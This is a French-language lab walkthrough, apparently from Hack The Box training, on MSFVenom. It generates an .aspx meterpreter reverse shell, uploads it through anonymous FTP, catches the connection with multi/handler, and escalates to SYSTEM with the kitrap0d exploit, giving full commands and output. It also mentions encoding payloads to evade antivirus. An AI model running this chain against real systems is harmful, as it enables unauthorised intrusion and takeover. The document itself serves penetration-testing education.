
 [[Metasploitable HTB]]

`MSFVenom` est le successeur de `MSFPayload` et `MSFEncode`, deux scripts autonomes qui fonctionnaient conjointement avec `msfconsole` pour fournir aux utilisateurs des charges utiles (payloads) hautement personnalisables et difficiles à détecter pour leurs exploits.

`MSFVenom` est le résultat de l'union de ces deux outils. Avant cet outil, nous devions rediriger via un pipe (`|`) le résultat de `MSFPayload`, qui était utilisé pour générer du shellcode pour une architecture de processeur et une version de système d'exploitation spécifiques, vers `MSFEncode`, qui contenait plusieurs schémas d'encodage utilisés à la fois pour supprimer les caractères indésirables du shellcode (ce qui pouvait parfois causer de l'instabilité lors de l'exécution), et pour contourner les anciens logiciels antivirus (`AV`) et de prévention/détection d'intrusion au niveau des points de terminaison (`IPS/IDS`).

De nos jours, ces deux outils combinés offrent aux testeurs d'intrusion (pentesters) une méthode pour créer rapidement des charges utiles pour différentes architectures et versions d'hôtes cibles, tout en ayant la possibilité de « nettoyer » leur shellcode afin qu'il ne rencontre aucune erreur lors du déploiement. La partie contournement d'AV est beaucoup plus compliquée aujourd'hui, car l'analyse des fichiers malveillants basée uniquement sur les signatures est une chose du passé. L'`analyse heuristique, l'apprentissage automatique (machine learning) et l'inspection approfondie des paquets (deep packet inspection)` rendent beaucoup plus difficile pour une charge utile de passer à travers plusieurs itérations successives d'un schéma d'encodage pour échapper à un bon logiciel AV. Comme vu dans le module `Payloads`, la soumission d'une charge utile simple avec la même configuration détaillée ci-dessus a donné un taux de détection de `52/65`. Dans le jargon des analystes de malwares du monde entier, c'est un Bingo. (Il n'est toujours pas prouvé que les analystes de malwares du monde entier disent réellement « c'est un Bingo ».)

---

## Création de nos charges utiles

Supposons que nous ayons trouvé un port FTP ouvert qui avait soit des identifiants faibles, soit était ouvert à une connexion anonyme par accident. Maintenant, supposons que le serveur FTP lui-même soit lié à un service web fonctionnant sur le port `tcp/80` de la même machine et que tous les fichiers trouvés dans le répertoire racine du FTP puissent être consultés dans le répertoire `/uploads` du service web. Supposons également que le service web ne vérifie pas ce que nous sommes autorisés à y exécuter en tant que client.

Si nous sommes hypothétiquement autorisés à appeler tout ce que nous voulons depuis le service web, nous pouvons alors téléverser un shell PHP directement via le serveur FTP et y accéder depuis le web, déclenchant ainsi la charge utile et nous permettant de recevoir une connexion TCP inversée (reverse TCP connection) de la part de la machine victime.

#### Analyse de la cible

        shellsession
`ppporrkkky@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5  <SNIP> PORT   STATE SERVICE VERSION 21/tcp open  ftp     Microsoft ftpd 80/tcp open  http    Microsoft IIS httpd 7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows`

#### Accès anonyme FTP

        shellsession
`ppporrkkky@htb[/htb]$ ftp 10.10.10.5  Connected to 10.10.10.5. 220 Microsoft FTP Service   Name (10.10.10.5:root): anonymous  331 Anonymous access allowed, send identity (e-mail name) as password.   Password: ******  230 User logged in. Remote system type is Windows_NT.   ftp> ls  200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17  02:06AM       <DIR>          aspnet_client 03-17-17  05:37PM                  689 iisstart.htm 03-17-17  05:37PM               184946 welcome.png 226 Transfer complete.`

En remarquant `aspnet_client`, nous réalisons que la machine sera capable d'exécuter des shells inversés `.aspx`. Heureusement pour nous, `msfvenom` peut faire exactement cela sans aucun problème.

#### Génération de la charge utile

        shellsession
`ppporrkkky@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx  [-] Aucune plateforme sélectionnée, choix de Msf::Module::Platform::Windows à partir de la charge utile [-] Aucune architecture sélectionnée, sélection de l'architecture : x86 à partir de la charge utile Aucun encodeur ou mauvais caractères spécifiés, affichage de la charge utile brute Taille de la charge utile : 341 octets Taille finale du fichier aspx : 2819 octets`

        shellsession
`ppporrkkky@htb[/htb]$ ls  Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates`

Ensuite, après avoir vérifié la création réussie du shell inversé `reverse_shell.aspx`, nous devons le téléverser sur le service FTP en utilisant la commande `put` comme suit :

        shellsession
`ftp > put reverse_shell.aspx local: reverse_shell.aspx remote: reverse_shell.aspx 229 Entering Extended Passive Mode (|||47832|) 150 Ok to send data. 100% |*********************| 2819       512.00 KiB/s 00:00 ETA 226 Transfer complete. 2819 bytes sent in 00:00 (489.12 KiB/s)`

Maintenant, il ne nous reste plus qu'à naviguer vers `http://10.10.10.5/reverse_shell.aspx` pour déclencher la charge utile `.aspx`. Cependant, avant de faire cela, nous devons démarrer un auditeur (listener) sur msfconsole afin que la demande de connexion inversée y soit interceptée.

#### MSF - Configuration de Multi/Handler

        shellsession
`ppporrkkky@htb[/htb]$ msfconsole -q   msf6 > use multi/handler msf6 exploit(multi/handler) > show options  Module options (exploit/multi/handler):     Name  Current Setting  Required  Description    ----  ---------------  --------  -----------   Exploit target:     Id  Name    --  ----    0   Wildcard Target   msf6 exploit(multi/handler) > set LHOST 10.10.14.5  LHOST => 10.10.14.5   msf6 exploit(multi/handler) > set LPORT 1337  LPORT => 1337   msf6 exploit(multi/handler) > run  [*] Started reverse TCP handler on 10.10.14.5:1337` 

---

## Exécution de la charge utile

Maintenant, nous pouvons déclencher la charge utile `.aspx` sur le service web. Cela ne chargera absolument rien visuellement sur la page, mais en regardant notre module `multi/handler`, nous aurons reçu une connexion. Nous devons nous assurer que notre fichier `.aspx` ne contient pas de HTML, nous ne verrons donc qu'une page web blanche. Cependant, la charge utile est exécutée en arrière-plan de toute façon.

http://10.10.10.5/reverse_shell.aspx

![Déclenchement de la charge utile .aspx en visitant la page web appropriée.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/39/S16_SS01.jpg)

#### MSF - Shell Meterpreter

        shellsession
`<...SNIP...> [*] Started reverse TCP handler on 10.10.14.5:1337   [*] Sending stage (176195 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000   meterpreter > getuid  Server username: IIS APPPOOL\Web   meterpreter >   [*] 10.10.10.5 - Session Meterpreter 1 fermée. Raison : Interrompue`

Si la session Meterpreter s'interrompt trop souvent, nous pouvons envisager de l'encoder pour éviter les erreurs lors de l'exécution. Nous pouvons choisir n'importe quel encodeur viable, et cela améliorera nos chances de succès dans tous les cas.

---

## Local Exploit Suggester

Pour information, il existe un module appelé `Local Exploit Suggester`. Nous utiliserons ce module pour cet exemple, car le shell Meterpreter a atterri sur l'utilisateur `IIS APPPOOL\Web`, qui n'a naturellement pas beaucoup d'autorisations. De plus, l'exécution de la commande `sysinfo` nous montre que le système a une architecture 32 bits (x86), ce qui nous donne une raison de plus de faire confiance au Local Exploit Suggester.

#### MSF - Recherche du Local Exploit Suggester

        shellsession
`msf6 > search local exploit suggester  <...SNIP...>    2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session    2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester    2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure  <SNIP>  msf6 exploit(multi/handler) > use 2376 msf6 post(multi/recon/local_exploit_suggester) > show options  Module options (post/multi/recon/local_exploit_suggester):     Name             Current Setting  Required  Description    ----             ---------------  --------  -----------    SESSION                           yes       The session to run this module on    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits   msf6 post(multi/recon/local_exploit_suggester) > set session 2  session => 2   msf6 post(multi/recon/local_exploit_suggester) > run  [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 31 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed`

Avec ces résultats sous les yeux, nous pouvons facilement en choisir un pour le tester. Si celui que nous avons choisi n'est finalement pas valide, passez au suivant. Toutes les vérifications ne sont pas précises à 100 %, et toutes les variables ne sont pas identiques. En parcourant la liste, `bypassuac_eventvwr` échoue car l'utilisateur IIS ne fait pas partie du groupe des administrateurs, ce qui est le comportement par défaut et attendu. La deuxième option, `ms10_015_kitrap0d`, fait l'affaire.

#### MSF - Élévation de privilèges locale

        shellsession
`msf6 exploit(multi/handler) > search kitrap0d  Matching Modules ================     #  Name                                     Disclosure Date  Rank   Check  Description    -  ----                                     ---------------  ----   -----  -----------    0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D   msf6 exploit(multi/handler) > use 0 msf6 exploit(windows/local/ms10_015_kitrap0d) > show options  Module options (exploit/windows/local/ms10_015_kitrap0d):     Name     Current Setting  Required  Description    ----     ---------------  --------  -----------    SESSION  2                yes       The session to run this module on.   Payload options (windows/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     tun0             yes       The listen address (an interface may be specified)    LPORT     1338             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Windows 2K SP4 - Windows 7 (x86)   msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338  LPORT => 1338   msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3  SESSION => 3   msf6 exploit(windows/local/ms10_015_kitrap0d) > run  [*] Auditeur TCP inversé démarré sur 10.10.14.5:1338  [*] Lancement de notepad pour héberger l'exploit... [+] Processus 3552 lancé. [*] Injection réflective de la DLL de l'exploit dans 3552... [*] Injection de l'exploit dans 3552 ... [*] Exploit injecté. Injection de la charge utile dans 3552... [*] Charge utile injectée. Exécution de l'exploit... [+] Exploit terminé, attente de l'exécution (avec un peu de chance, avec privilèges) de la charge utile. [*] Envoi du stage (176195 octets) à 10.10.10.5 [*] Session Meterpreter 4 ouverte (10.10.14.5:1338 -> 10.10.10.5:49162) le 2020-08-28 17:15:56 +0000   meterpreter > getuid  Server username: NT AUTHORITY\SYSTEM`